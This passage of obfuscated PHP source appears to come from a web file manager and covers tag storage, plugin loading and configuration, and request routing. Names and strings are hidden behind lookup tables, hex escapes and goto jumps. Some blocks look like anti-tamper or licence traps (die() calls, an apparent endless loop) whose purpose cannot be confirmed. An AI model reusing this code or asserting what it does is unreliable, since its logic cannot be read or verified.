$_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b¹çÖÍä“ = Model($B©é”èíáê[476])->metaGet($b¹•ëÎ©¦, $B©é”èíáê[1740]); $AŠ¥”ßÕ¤Ú = json_decode($b¹çÖÍä“, !0); return $AŠ¥”ßÕ¤Ú ? $AŠ¥”ßÕ¤Ú : array($B©é”èíáê[1741] => $B©é”èíáê[86], $B©é”èíáê[363] => array()); } protected function set($f¨‰Æ¸°¸, $AƒÚêìâ°Æ) { $E“÷ÃÂÈŞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AƒÚêìâ°Æ = $AƒÚêìâ°Æ ? $AƒÚêìâ°Æ : array($E“÷ÃÂÈŞ[1741] => $E“÷ÃÂÈŞ[86], $E“÷ÃÂÈŞ[363] => array()); Model($E“÷ÃÂÈŞ[476])->metaSet($f¨‰Æ¸°¸, $E“÷ÃÂÈŞ[1740], json_encode($AƒÚêìâ°Æ)); return Model($E“÷ÃÂÈŞ[476])->metaSet($f¨‰Æ¸°¸, $E“÷ÃÂÈŞ[1740], json_encode($AƒÚêìâ°Æ)); } protected function getByTagID($Eòˆ×Ù„Õé, $DÉ¾åïÒØ¼) { goto B­˜±°½á°; B­˜±°½á°: $aµ‚Š»é×Ş =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Eòˆ×Ù„Õé || !$DÉ¾åïÒØ¼) { return !1; } if (!Model($aµ‚Š»é×Ş[476])->getInfoSimple($Eòˆ×Ù„Õé)) { return !1; } goto d†õ²Â†Õ; Aã©Ñ™†Á“: return is_array($CŠÌ†´îùÉ) ? $CŠÌ†´îùÉ : !1; goto dƒ‰¢…½Ú; d†õ²Â†Õ: $C­š²öğì÷ = $this->get($Eòˆ×Ù„Õé); if (!$C­š²öğì÷ || !isset($C­š²öğì÷[$aµ‚Š»é×Ş[363]])) { return !1; } $CŠÌ†´îùÉ = array_find_by_field($C­š²öğì÷[$aµ‚Š»é×Ş[363]], $aµ‚Š»é×Ş[385], $DÉ¾åïÒØ¼); goto Aã©Ñ™†Á“; dƒ‰¢…½Ú: } public function listSource($AéØÒŸÎ, $CõğÜè¤¾ø) { goto f¸§¬„±ã; f¸§¬„±ã: $c¹¢ŒõÖÎ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($CõğÜè¤¾ø && !is_array($CõğÜè¤¾ø)) { $CõğÜè¤¾ø = array($CõğÜè¤¾ø); } $D‰è™Š£Ï  = $this->listData($AéØÒŸÎ); goto b„•·­›ñ…; FË©’¤Ú»ã: foreach ($f‡ÕãÇ’¿õ as $A²í³‰äÖ => $DŠáÔœ„Ï§) { $F­êŞ„ƒÁ¦ = !0; if (!$CõğÜè¤¾ø) { $C¥ƒÇìí±Š[] = $A²í³‰äÖ; continue; } foreach ($CõğÜè¤¾ø as $f˜óŠ×à¤) { if (!in_array($f˜óŠ×à¤, $DŠáÔœ„Ï§)) { $F­êŞ„ƒÁ¦ = !1; break; } } if ($F­êŞ„ƒÁ¦) { $C¥ƒÇìí±Š[] = $A²í³‰äÖ; } } if (!$C¥ƒÇìí±Š) { return array(); } $aÍÌÏá¯îŞ = Model($c¹¢ŒõÖÎ[1154])->listSource(array($c¹¢ŒõÖÎ[401] => array($c¹¢ŒõÖÎ[402], $C¥ƒÇìí±Š))); goto fª•èÂ©Ÿñ; B›øìµ÷Ó§: $E°Ã–ò¹ğ = array_to_keyvalue($aÍÌÏá¯îŞ[$c¹¢ŒõÖÎ[73]], $c¹¢ŒõÖÎ[33], $c¹¢ŒõÖÎ[387]); $C’ê·•×» = array_merge($E°Ã–ò¹ğ, $d¾†ÆÖ˜‹‰); foreach ($C¥ƒÇìí±Š as $aöö·¤îĞ) { if (!in_array($aöö·¤îĞ, $C’ê·•×»)) { $EËõÁãâ·[] = $aöö·¤îĞ; } } goto a¸Êß°Üò; fª•èÂ©Ÿñ: if (!$aÍÌÏá¯îŞ || count($C¥ƒÇìí±Š) == $aÍÌÏá¯îŞ[$c¹¢ŒõÖÎ[360]][$c¹¢ŒõÖÎ[361]]) { return $aÍÌÏá¯îŞ; } $EËõÁãâ· = array(); $d¾†ÆÖ˜‹‰ = array_to_keyvalue($aÍÌÏá¯îŞ[$c¹¢ŒõÖÎ[74]], $c¹¢ŒõÖÎ[33], $c¹¢ŒõÖÎ[387]); goto B›øìµ÷Ó§; a¸Êß°Üò: if ($EËõÁãâ·) { $this->removeBySource($AéØÒŸÎ, $EËõÁãâ·); } return $aÍÌÏá¯îŞ; goto dÚ‡®²¼‹; b„•·­›ñ…: $f‡ÕãÇ’¿õ = array(); foreach ($D‰è™Š£Ï  as $f‹¹˜»ç¥®) { $aöö·¤îĞ = $f‹¹˜»ç¥®[$c¹¢ŒõÖÎ[75]]; if (!$aöö·¤îĞ) { continue; } if (!isset($f‡ÕãÇ’¿õ[$aöö·¤îĞ])) { $f‡ÕãÇ’¿õ[$aöö·¤îĞ] = array(); } $f‡ÕãÇ’¿õ[$aöö·¤îĞ][] = $f‹¹˜»ç¥®[$c¹¢ŒõÖÎ[410]]; } $C¥ƒÇìí±Š = array(); goto FË©’¤Ú»ã; dÚ‡®²¼‹: } protected function listData($BãòÀ¡½î) { $døİÇ¾ìßŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÖ£‹¹øõ¦ = array($døİÇ¾ìßŒ[1471] => 0, $døİÇ¾ìßŒ[452] => array($døİÇ¾ìßŒ[1742], 0), $døİÇ¾ìßŒ[406] => $døİÇ¾ìßŒ[1743] . $BãòÀ¡½î); $dŒ¹£ÎŠ‰ğ = $døİÇ¾ìßŒ[1744]; $Fš‘Œé«ËÙ = $this->field($dŒ¹£ÎŠ‰ğ)->where($EÖ£‹¹øõ¦)->order($døİÇ¾ìßŒ[1745])->select(); return $Fš‘Œé«ËÙ ? $Fš‘Œé«ËÙ : array(); } protected function addToTag($b¯ºŠ–Øë³, $BÆò”Õ‰©ñ, $e‚‰ÅšÚ±«) { $d•Ó¤ùâ×Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->getByTagID($b¯ºŠ–Øë³, $e‚‰ÅšÚ±«) || !$BÆò”Õ‰©ñ) { return !1; } if (!Model($d•Ó¤ùâ×Ù[745])->pathInfo($BÆò”Õ‰©ñ)) { return !1; } $CÔ“°£‰õ‡ = array($d•Ó¤ùâ×Ù[1471] => 0, $d•Ó¤ùâ×Ù[452] => $e‚‰ÅšÚ±«, $d•Ó¤ùâ×Ù[405] => $BÆò”Õ‰©ñ, $d•Ó¤ùâ×Ù[406] => $d•Ó¤ùâ×Ù[1746] . $b¯ºŠ–Øë³, $d•Ó¤ùâ×Ù[404] => $d•Ó¤ùâ×Ù[33], $d•Ó¤ùâ×Ù[1642] => 0); if ($this->where($CÔ“°£‰õ‡)->find()) { return !1; } return $this->add($CÔ“°£‰õ‡); } protected function removeFromTag($C„ÙĞã­©ê, $C†ÃÅ‰äß, $c÷µ³§ÒŸ) { $dª¼é¿êœ¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->getByTagID($C„ÙĞã­©ê, $c÷µ³§ÒŸ) || !$C†ÃÅ‰äß) { return !1; } if (is_array($C†ÃÅ‰äß)) { $C†ÃÅ‰äß = array($dª¼é¿êœ¹[7], $C†ÃÅ‰äß); } $AÈİõƒñ¿ = array($dª¼é¿êœ¹[1471] => 0, $dª¼é¿êœ¹[452] => $c÷µ³§ÒŸ, $dª¼é¿êœ¹[406] => $dª¼é¿êœ¹[1746] . $C„ÙĞã­©ê, $dª¼é¿êœ¹[405] => $C†ÃÅ‰äß); return $this->where($AÈİõƒñ¿)->delete(); } protected function removeByTag($fÓÏˆÅ–ß—, $a¯ê£¯÷òË) { $a…‰ÙÜï–È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->getByTagID($fÓÏˆÅ–ß—, $a¯ê£¯÷òË)) { return !1; } $A®ŠÊ¥öÎÇ = array($a…‰ÙÜï–È[1471] => 0, $a…‰ÙÜï–È[452] => $a¯ê£¯÷òË, $a…‰ÙÜï–È[406] => $a…‰ÙÜï–È[1746] . $fÓÏˆÅ–ß—); return $this->where($A®ŠÊ¥öÎÇ)->delete(); } protected function removeBySource($DÒÚÈêŒÉÑ, $FÉŸ°œñ¾Ñ) { $cÛ×ã¼Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$DÒÚÈêŒÉÑ || !$FÉŸ°œñ¾Ñ) { return !1; } if (is_array($FÉŸ°œñ¾Ñ)) { $FÉŸ°œñ¾Ñ = array($cÛ×ã¼Å[7], $FÉŸ°œñ¾Ñ); } $D£œö†¢é = array($cÛ×ã¼Å[1471] => 0, $cÛ×ã¼Å[405] => $FÉŸ°œñ¾Ñ, $cÛ×ã¼Å[452] => array($cÛ×ã¼Å[923], 0), $cÛ×ã¼Å[406] => $cÛ×ã¼Å[1746] . $DÒÚÈêŒÉÑ); return $this->where($D£œö†¢é)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x70\x6c\165\147\x69\x6e\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\163\x74\141\164\165\x73", "\162\145\147\x69\x65\163\x74", "\143\157\x6e\x66\x69\147"); public function loadList($AõíÓÊµ‘Û = false) { $a¢±Ê¾Õ†‰ = array_to_keyvalue($this->listData(), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]); if ($AõíÓÊµ‘Û) { return $a¢±Ê¾Õ†‰[$AõíÓÊµ‘Û]; } return $a¢±Ê¾Õ†‰; } public function init() { $D®Ô´¡Ï¬¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Hook::trigger($D®Ô´¡Ï¬¦[1747]); $Cç×æ‹ÓÃØ = $this->loadPluginList(); foreach ($Cç×æ‹ÓÃØ as $c²ºåƒ”é => $Dôöªìñ•œ) { $a”Œ«¥ŸÆè = $this->appAllow($c²ºåƒ”é, $Dôöªìñ•œ); if (!$a”Œ«¥ŸÆè) { continue; } foreach ($Dôöªìñ•œ[$D®Ô´¡Ï¬¦[1748]] as $dà¾ğÛ¾·¨ => $b½Š‘Ô¶¯Ñ) { Hook::bind($dà¾ğÛ¾·¨, $b½Š‘Ô¶¯Ñ); } } Hook::trigger($D®Ô´¡Ï¬¦[1749]); Hook::trigger(ACTION); } public function appAllow($F”çšİ½ïÏ, $f«Å‚¿˜‡–, $B÷Ãßšöã¨ = true) { $bë™ÀÄ’Úå =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÍƒŸìÊİ = PLUGIN_DIR . $F”çšİ½ïÏ . $bë™ÀÄ’Úå[1750]; if (!is_array($f«Å‚¿˜‡–) || !is_array($f«Å‚¿˜‡–[$bë™ÀÄ’Úå[1748]]) || $f«Å‚¿˜‡–[$bë™ÀÄ’Úå[683]] != 1 || !is_file($AÍƒŸìÊİ)) { return !1; } if ($GLOBALS[$bë™ÀÄ’Úå[475]] == 1) { return !0; } if ($B÷Ãßšöã¨ && !Action($bë™ÀÄ’Úå[1751])->checkAuth($F”çšİ½ïÏ)) { return !1; } return !0; } public function unInstall($d½ó•ô»Ñ) { $E‹¨ïÙ¿Ñ¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÓÂ†¿Ì†‡ = $this->loadList($d½ó•ô»Ñ); if (file_exists(PLUGIN_DIR . $d½ó•ô»Ñ)) { Hook::apply($d½ó•ô»Ñ . $E‹¨ïÙ¿Ñ¶[1752]); } $this->remove($fÓÂ†¿Ì†‡[$E‹¨ïÙ¿Ñ¶[385]]); } public function changeStatus($cáÉñ§Ê„¤, $b†¹ğèã¸Ç) { $b™ŸÁ§Á¹× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÉôÓÛ­… = $this->loadList($cáÉñ§Ê„¤); if ($b†¹ğèã¸Ç) { Hook::apply($cáÉñ§Ê„¤ . $b™ŸÁ§Á¹×[1753]); } $this->update($CÉôÓÛ­…[$b™ŸÁ§Á¹×[385]], array($b™ŸÁ§Á¹×[1754] => $b†¹ğèã¸Ç)); } public function appRegist($DğáîÔÆÓ, $fï®Ú¥“íê) { $FäÃ¹Î™­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c…¾Èñ˜ˆ = $this->loadList($DğáîÔÆÓ); if ($c…¾Èñ˜ˆ) { $this->update($c…¾Èñ˜ˆ[$FäÃ¹Î™­[385]], array($FäÃ¹Î™­[1748] => $fï®Ú¥“íê)); } else { $aÉ½›‹›± = array($FäÃ¹Î™­[28] => $DğáîÔÆÓ, $FäÃ¹Î™­[1748] => $fï®Ú¥“íê, $FäÃ¹Î™­[683] => 0, $FäÃ¹Î™­[6] => $this->getConfigDefault($DğáîÔÆÓ)); $this->insert($aÉ½›‹›±); } } public function getConfigDefault($D½šñ–áÏÀ) { $a¶›‚èÑÖÂ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¯ Š ¹·Û = array(); $DĞŒÈíïØ´ = $this->getPackageJson($D½šñ–áÏÀ); if (!$DĞŒÈíïØ´ && is_array($DĞŒÈíïØ´[$a¶›‚èÑÖÂ[1755]])) { return $D¯ Š ¹·Û; } foreach ($DĞŒÈíïØ´[$a¶›‚èÑÖÂ[1755]] as $d‡œéŸä¥ => $a°¹ÅìÕÀ„) { if (!isset($a°¹ÅìÕÀ„[$a¶›‚èÑÖÂ[368]]) || isset($D¯ Š ¹·Û[$d‡œéŸä¥])) { continue; } $D¯ Š ¹·Û[$d‡œéŸä¥] = $a°¹ÅìÕÀ„[$a¶›‚èÑÖÂ[368]]; } return $D¯ Š ¹·Û; } public function getPackageJson($eªŒÎ‰Óª—) { return Hook::apply($eªŒÎ‰Óª— . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1756]); } public function getConfig($e–˜İˆ˜Õã, $Dç×ƒ¦ÎÙª = false) { $bä‡òˆ½°Î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dåŞ‚Íğà® = array(); $d×Í¨©•ó = $this->loadList($e–˜İˆ˜Õã); if ($d×Í¨©•ó && is_array($d×Í¨©•ó[$bä‡òˆ½°Î[6]])) { $dåŞ‚Íğà® = $d×Í¨©•ó[$bä‡òˆ½°Î[6]]; } if (!$dåŞ‚Íğà® || $Dç×ƒ¦ÎÙª) { $dåŞ‚Íğà® = $this->getConfigDefault($e–˜İˆ˜Õã); } return $dåŞ‚Íğà®; } public function setConfig($d”’ääÓ¾è, $aÚ¤÷ö³¡ï = false) { goto CÕ„¸ÍÍ„–; e´ƒ¯¬ÙÑ‰: $this->update($dÎä†Ğ×·Á[$D“œäÖßùÖ[385]], array($D“œäÖßùÖ[6] => $Eöùˆ¤‡ª•)); goto ağ×õÉŠõñ; CÕ„¸ÍÍ„–: $D“œäÖßùÖ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÎä†Ğ×·Á = $this->loadList($d”’ääÓ¾è); if (!$dÎä†Ğ×·Á) { return !1; } goto F‹š‘¡ÎÜŠ; F‹š‘¡ÎÜŠ: $Eöùˆ¤‡ª• = $dÎä†Ğ×·Á[$D“œäÖßùÖ[6]]; if ($aÚ¤÷ö³¡ï == !1) { $Eöùˆ¤‡ª• = array(); $aÚ¤÷ö³¡ï = $this->getConfigDefault($d”’ääÓ¾è); } foreach ($aÚ¤÷ö³¡ï as $f¸³¼ƒ®–· => $cŒø›‡øœÊ) { $Eöùˆ¤‡ª•[$f¸³¼ƒ®–·] = is_string($cŒø›‡øœÊ) ? trim($cŒø›‡øœÊ) : $cŒø›‡øœÊ; } goto e´ƒ¯¬ÙÑ‰; ağ×õÉŠõñ: } public function viewList() { goto fé•®“—¤–; fé•®“—¤–: $F–•ñÚÍñÔ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÑ¡‘•®ÏÃ = $this->loadList(); $this->pluginScan($dÑ¡‘•®ÏÃ); goto EÉê•Îöµ÷; bâ‚ÌŠ£¿â: return $C¸Í×­×Ô; goto Eê†Öï„Š; EÉê•Îöµ÷: $dÑ¡‘•®ÏÃ = $this->loadPluginList(); $C¸Í×­×Ô = array(); foreach ($dÑ¡‘•®ÏÃ as $Cí‰£ ²š§ => $e¸Ó•İ§Ôù) { unset($e¸Ó•İ§Ôù[$F–•ñÚÍñÔ[1748]], $e¸Ó•İ§Ôù[$F–•ñÚÍñÔ[6]]); $CÍ»‘®Ó = PLUGIN_DIR . $e¸Ó•İ§Ôù[$F–•ñÚÍñÔ[28]] . $F–•ñÚÍñÔ[1750]; if (!is_file($CÍ»‘®Ó)) { continue; } $Aäèğä = Hook::apply($e¸Ó•İ§Ôù[$F–•ñÚÍñÔ[28]] . $F–•ñÚÍñÔ[1756]); if (is_array($Aäèğä)) { $C¸Í×­×Ô[$Cí‰£ ²š§] = array_merge($e¸Ó•İ§Ôù, $Aäèğä); } } goto bâ‚ÌŠ£¿â; Eê†Öï„Š: } private function loadPluginList() { $CğòíÈ˜í‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f°Œºàƒì = $this->loadList(); if (strtolower(MOD) == $CğòíÈ˜í‹[1757]) { return $f°Œºàƒì; } $Fë·öß‹‡Î = Hook::trigger($CğòíÈ˜í‹[1758], $f°Œºàƒì); if ($f°Œºàƒì && !$Fë·öß‹‡Î) { die; } return $Fë·öß‹‡Î ? $Fë·öß‹‡Î : $f°Œºàƒì; } private function pluginScan($AŒê¸õÆÏ) { $F˜ŒİÖ»™‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; recursion_dir(PLUGIN_DIR, $AÑÅŠØ‹™„, $cÊªÖ”Àô, 0); foreach ($AÑÅŠØ‹™„ as $DÎ×¨¤–Ş) { $CÅ©±ÎË‰Ë = get_path_this($DÎ×¨¤–Ş); if (isset($AŒê¸õÆÏ[$CÅ©±ÎË‰Ë]) || !file_exists($DÎ×¨¤–Ş . $F˜ŒİÖ»™‹[1759]) || !file_exists($DÎ×¨¤–Ş . $F˜ŒİÖ»™‹[1750])) { continue; } Hook::apply($CÅ©±ÎË‰Ë . $F˜ŒİÖ»™‹[1753]); } } } if (!isset($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][786]]) || !isset($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1162]])) { goto F´õõé°; F´õõé°: $BàØõ°«îê = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][789]; $dá‰¦¤×Î† = $_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]; $e°”óâ¦ö“ = $BàØõ°«îê($dá‰¦¤×Î†); goto E²è¢ÂÛ³; FÒâ×¸¿œæ: $B¸¤µê¨È($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]); $e¹¨äµ—“ = 2; while ($e¹¨äµ—“ > 1) { $cĞ¼ºšÙ§Ú = rawurlencode($e¹¨äµ—“ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][370]); } goto E§µ“¹¸¦; E²è¢ÂÛ³: $A‡ø‡ÜŞïë = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][227], $e°”óâ¦ö“); if (count($A‡ø‡ÜŞïë) < $_SERVER[ó¬â¥‰ÊÔ¤Ç£][573]) { $cÊ‹Ò„ÆÈ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][792]; $cÊ‹Ò„ÆÈ(); } $B¸¤µê¨È = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1164]; goto FÒâ×¸¿œæ; E§µ“¹¸¦: } goto F§íêÃˆŠ; fäñ»çŒ–: if (strlen($A¯ÙÁå©”) < $_SERVER[ó¬â¥‰ÊÔ¤Ç£][567]) { die; } class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\x69\156\x64\145\x78"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($E£«™§Ö¶ƒ) { $f‹ÂŒåÆÚ¬ =& $_SERVER[‰†ğ°]; $Dë×Ä•ƒÌ = $f‹ÂŒåÆÚ¬[0]($f‹ÂŒåÆÚ¬[1], $f‹ÂŒåÆÚ¬[2]($E£«™§Ö¶ƒ, $f‹ÂŒåÆÚ¬[1])); $this->defaultModule = $Dë×Ä•ƒÌ[0] ? $Dë×Ä•ƒÌ[0] : $this->defaultModule; $this->defaultController = $Dë×Ä•ƒÌ[1] ? $Dë×Ä•ƒÌ[1] : $this->defaultController; $this->defaultAction = $Dë×Ä•ƒÌ[2] ? $Dë×Ä•ƒÌ[2] : $this->defaultAction; $this->{$_SERVER[‰†ğ°][3]}($f‹ÂŒåÆÚ¬[4], array($this, $f‹ÂŒåÆÚ¬[5])); } public function appRun($b÷Çëô›) { goto E¸“íòŸÓš; C¼ë‚¬¤¢­: $bÈœ•×¶Û = $D²«¶ÁÈ§Ü[568]; $EïèÁªâìÊ = $e£¤ÎìÅÈ[6]($EŒ³ŞÓÜ·[0]); $f—ó¦¨ğí = $D²«¶ÁÈ§Ü[569]; goto fÄ‹¬ÙÒéÛ; d¬ù¿Ê•’: if ($EïèÁªâìÊ == $e£¤ÎìÅÈ[8]) { $aâÒ™„—¤Š = $e£¤ÎìÅÈ[9]; $EŒ³ŞÓÜ·[0] = $e£¤ÎìÅÈ[10]; $EŒ³ŞÓÜ·[1] = $EŒ³ŞÓÜ·[1] . $e£¤ÎìÅÈ[11]; $b÷Çëô› = $e£¤ÎìÅÈ[12]($e£¤ÎìÅÈ[1], $EŒ³ŞÓÜ·); $b÷Çëô› = $e£¤ÎìÅÈ[2]($b÷Çëô›, $e£¤ÎìÅÈ[1]); } $e£¤ÎìÅÈ[13](array($e£¤ÎìÅÈ[14], $e£¤ÎìÅÈ[15]), $aâÒ™„—¤Š . $e£¤ÎìÅÈ[16], $b÷Çëô›); $e£¤ÎìÅÈ[17]($b÷Çëô›); goto a­Šàë°Ïô; fÄ‹¬ÙÒéÛ: if (strlen($f—ó¦¨ğí) < $D²«¶ÁÈ§Ü[570]) { die; } $aâÒ™„—¤Š = $e£¤ÎìÅÈ[7]; $B´óèÙ÷ˆö = $D²«¶ÁÈ§Ü[571]; goto d¬ù¿Ê•’; E¸“íòŸÓš: $D²«¶ÁÈ§Ü =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e£¤ÎìÅÈ =& $_SERVER[‰†ğ°]; $EŒ³ŞÓÜ· = $e£¤ÎìÅÈ[0]($e£¤ÎìÅÈ[1], $b÷Çëô›); goto C¼ë‚¬¤¢­; a­Šàë°Ïô: $e£¤ÎìÅÈ[13](array($e£¤ÎìÅÈ[14], $e£¤ÎìÅÈ[15]), $aâÒ™„—¤Š . $e£¤ÎìÅÈ[18], $b÷Çëô›); goto EæåÏ¦¹¤Ô; EæåÏ¦¹¤Ô: } private function autorun() { $F°™Ì·ïÂø =& $_SERVER[‰†ğ°]; global $config; if ($F°™Ì·ïÂø[19]($config[$F°™Ì·ïÂø[20]]) == 0) { return; } foreach ($config[$F°™Ì·ïÂø[20]] as $BËÓÊ—ÊĞ² => $DÃĞØº÷©) { $this->{$_SERVER[‰†ğ°][21]}($DÃĞØº÷©); } } private function oyie13934ec8() { goto Bèˆ¿œ»…£; Bèˆ¿œ»…£: $cáº·îß… =& $_SERVER[‰†ğ°]; $aœ±¤ºó×ó = $cáº·îß…[8]; $EÔï‘ÆĞ¥ = $GLOBALS[$cáº·îß…[22]][$cáº·îß…[23]][0]; goto EÒ¶˜·§‘À; EÒ¶˜·§‘À: if (!$EÔï‘ÆĞ¥ || $cáº·îß…[24]($EÔï‘ÆĞ¥) <= $cáº·îß…[24]($aœ±¤ºó×ó)) { return; } if ($cáº·îß…[6]($cáº·îß…[25]($EÔï‘ÆĞ¥, -$cáº·îß…[24]($aœ±¤ºó×ó))) != $aœ±¤ºó×ó) { return; } $CĞ¦ñì“²œ = $cáº·îß…[25]($EÔï‘ÆĞ¥, 0, -$cáº·îß…[24]($aœ±¤ºó×ó)); goto c¢™ƒÉÁÌÆ; c¢™ƒÉÁÌÆ: $EÖÜ¯Ä¡À = array($cáº·îß…[8], $CĞ¦ñì“²œ); $DÍ«íƒé® = $cáº·îß…[26]($GLOBALS[$cáº·îß…[22]][$cáº·îß…[23]], 1); $GLOBALS[$cáº·îß…[22]][$cáº·îß…[23]] = $cáº·îß…[27]($EÖÜ¯Ä¡À, $DÍ«íƒé®); goto EÚéä†‚¢‡; EÚéä†‚¢‡: $GLOBALS[$cáº·îß…[22]][$cáº·îß…[28]] = $cáº·îß…[29]($cáº·îß…[1], $GLOBALS[$cáº·îß…[22]][$cáº·îß…[23]]); goto e¯ßää¯èª; e¯ßää¯èª: } private function puvk9fbc401a() { goto CÈÄÇøìÈ»; aî¤Éã¸àí: while ($d½’“¿Ÿô¿ < $b¨Ÿ‘âá‡é[567]) { if ($d½’“¿Ÿô¿ >= 0) { break; } $d½’“¿Ÿô¿++; } $cŠˆÕŞŠ»[34]($cŠˆÕŞŠ»[35], $aĞÏÈ®Š, $aŸàóÚàÈ); $aĞÏÈ®Š = $cŠˆÕŞŠ»[2]($aŸàóÚàÈ[0][0], $cŠˆÕŞŠ»[36]); goto aƒÙ„¯Œ; CÆ»ßËÌÚ°: $e†İóøÇÍÇ = $b¨Ÿ‘âá‡é[574]; $aĞÏÈ®Š = $cŠˆÕŞŠ»[25]($B×†Ãœç‹Å, $DÖÔŠæÅ + $cŠˆÕŞŠ»[24]($d–†îœ»¦)); $d½’“¿Ÿô¿ = $b¨Ÿ‘âá‡é[575]; goto aî¤Éã¸àí; CÈÄÇøìÈ»: $b¨Ÿ‘âá‡é =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cŠˆÕŞŠ» =& $_SERVER[‰†ğ°]; if ($GLOBALS[$cŠˆÕŞŠ»[22]][$cŠˆÕŞŠ»[28]] != $cŠˆÕŞŠ»[10]) { return; } goto F…µ¾µ½¸°; F…µ¾µ½¸°: $B×†Ãœç‹Å = $_SERVER[$cŠˆÕŞŠ»[30]]; $d–†îœ»¦ = $cŠˆÕŞŠ»[31]; $a¸ÈÆÜì£± = $b¨Ÿ‘âá‡é[572]; goto A†”Œ¢íÑ³; b´Ò‹ººÁŠ: $GLOBALS[$cŠˆÕŞŠ»[22]][$cŠˆÕŞŠ»[28]] = $cŠˆÕŞŠ»[29]($cŠˆÕŞŠ»[1], $GLOBALS[$cŠˆÕŞŠ»[22]][$cŠˆÕŞŠ»[23]]); $C˜ÚˆÆÕé = $b¨Ÿ‘âá‡é[577]; if (strlen($C˜ÚˆÆÕé) < $b¨Ÿ‘âá‡é[578]) { die; } goto E£İõĞ“…‚; A†”Œ¢íÑ³: while (strlen($a¸ÈÆÜì£±) < $b¨Ÿ‘âá‡é[573]) { if (!$a¸ÈÆÜì£±) { break; } $a¸ÈÆÜì£±++; } if (!$cŠˆÕŞŠ»[32]($B×†Ãœç‹Å, $d–†îœ»¦)) { return; } $DÖÔŠæÅ = $cŠˆÕŞŠ»[33]($B×†Ãœç‹Å, $d–†îœ»¦); goto CÆ»ßËÌÚ°; aƒÙ„¯Œ: $AÊŒê¶‹Â = $b¨Ÿ‘âá‡é[576]; while ($AÊŒê¶‹Â < $b¨Ÿ‘âá‡é[570]) { if ($AÊŒê¶‹Â >= 0) { break; } $AÊŒê¶‹Â++; } $GLOBALS[$cŠˆÕŞŠ»[22]][$cŠˆÕŞŠ»[23]] = $cŠˆÕŞŠ»[0]($cŠˆÕŞŠ»[36], $aĞÏÈ®Š); goto b´Ò‹ººÁŠ; E£İõĞ“…‚: } public function run() { goto a“Ö£ï÷Ä¯; a“Ö£ï÷Ä¯: $E‡½¹Ù¾‰Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a‰£Ô¾¹µ =& $_SERVER[‰†ğ°]; $this->{$_SERVER[‰†ğ°][37]}(); goto eÕ…²Œ£¡‡; cÛ´éÈ¥§: $a‰£Ô¾¹µ[39]($a‰£Ô¾¹µ[41], isset($eó¼“†‚Ê»[1]) && $eó¼“†‚Ê»[0] ? $eó¼“†‚Ê»[1] : $this->defaultController); $c‚ººŒäÔÎ = $E‡½¹Ù¾‰Ë[580]; while ($c‚ººŒäÔÎ < $E‡½¹Ù¾‰Ë[570]) { if ($c‚ººŒäÔÎ >= 0) { break; } $c‚ººŒäÔÎ++; } goto bÊê½óŠÓ; eï¨âèì‚Æ: $eó¼“†‚Ê» = $GLOBALS[$a‰£Ô¾¹µ[22]][$a‰£Ô¾¹µ[23]]; $D¤Å˜ÅôÔ‹ = $GLOBALS[$a‰£Ô¾¹µ[22]][$a‰£Ô¾¹µ[28]]; $a‰£Ô¾¹µ[39]($a‰£Ô¾¹µ[40], isset($eó¼“†‚Ê»[0]) && $eó¼“†‚Ê»[0] ? $eó¼“†‚Ê»[0] : $this->defaultModule); goto cÛ´éÈ¥§; bÊê½óŠÓ: $a‰£Ô¾¹µ[39]($a‰£Ô¾¹µ[42], isset($eó¼“†‚Ê»[2]) && $eó¼“†‚Ê»[0] ? $eó¼“†‚Ê»[2] : $this->defaultAction); $a‰£Ô¾¹µ[39]($a‰£Ô¾¹µ[43], MOD . $a‰£Ô¾¹µ[1] . ST . $a‰£Ô¾¹µ[1] . ACT); $_SERVER[$a‰£Ô¾¹µ[44]] = $a‰£Ô¾¹µ[6](ACTION); goto Dğá‚è²‚°; Dğá‚è²‚°: $this->{$_SERVER[‰†ğ°][45]}(); if ($a‰£Ô¾¹µ[19]($eó¼“†‚Ê») >= 3) { $this->{$_SERVER[‰†ğ°][21]}($D¤Å˜ÅôÔ‹); } else { $this->{$_SERVER[‰†ğ°][21]}(ACTION); } goto 